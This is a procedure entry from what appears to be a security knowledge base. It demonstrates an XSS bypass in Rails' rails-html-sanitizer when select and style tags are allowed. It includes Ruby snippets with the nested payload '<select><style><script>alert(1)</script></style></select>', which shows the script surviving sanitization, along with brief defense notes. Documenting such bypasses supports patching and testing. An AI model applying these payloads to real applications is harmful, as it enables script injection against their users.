---
id: proc-uuid-3
tags:
  - xss
  - verification
type: procedure
tools:
  - '[[tools/rails-html-sanitizer]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/rails-sanitizer-xss-bypass-demo]]'
  - '[[commands/rails-sanitizer-direct-fragment-test]]'
verified: false
platforms:
  - Ruby
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:25.831Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Sanitize Input and Verify Script Preservation

## Summary

This procedure processes the malicious input through the sanitizer and inspects the output to confirm the script tag remains, proving the XSS bypass.

## Description

Executing the sanitize method reveals the vulnerability: the output '<select><style>W<script>alert(1)</script></style></select>' retains the script, executable if rendered in a browser. This affects environments allowing these tags, leading to JavaScript alerts or further payloads. Test in JRuby for nekohtml specifics or CRuby for direct nesting.

## Requirements

1. Prior steps completed (configuration and input crafting)
2. Rails environment with vulnerable sanitizer version
3. Ability to print or inspect output

## Defense

Defensive measures and detection strategies:

- Patch to rails-html-sanitizer 1.4.3 or later
- Audit sanitizer configurations for risky tags
- Browser-side CSP to block inline scripts

## Objectives

1. Confirm bypass by checking output
2. Validate JavaScript executability
3. Demonstrate impact in controlled setup

## Instructions

### Step 1: Run Sanitization Demo

**Context**: Use the full demo command to input, sanitize, and output for verification.

**Command** ([[commands/rails-sanitizer-xss-bypass-demo]]):
```ruby
tags = %w(select style)
puts "------------------------------------------------------------------"
puts "use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag"
puts "input: <select<style/>W<xmp<script>alert(1)</script>"
puts "output: "+Rails::Html::SafeListSanitizer.new.sanitize("<select<style/>W<xmp<script>alert(1)</script>", tags: tags).to_s
puts "------------------------------------------------------------------"
```

> Prints input and output. Expected: Script preserved in style.

### Step 2: Test Direct Fragment

**Context**: Verify with a simpler nested example in CRuby.

**Command** ([[commands/rails-sanitizer-direct-fragment-test]]):
```ruby
frag = "<select><style><script>alert(1)</script></style></select>"
tags = %w(select style)
puts Rails::Html::SafeListSanitizer.new.sanitize(frag, tags: tags)
```

> Outputs unsanitized fragment. Expected: Full HTML with script intact.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/rails-sanitizer-xss-bypass-demo]]
- [[commands/rails-sanitizer-direct-fragment-test]]

## Tools Used

- [[tools/rails-html-sanitizer]]

## Tags

- [[xss]]
- [[bypass]]
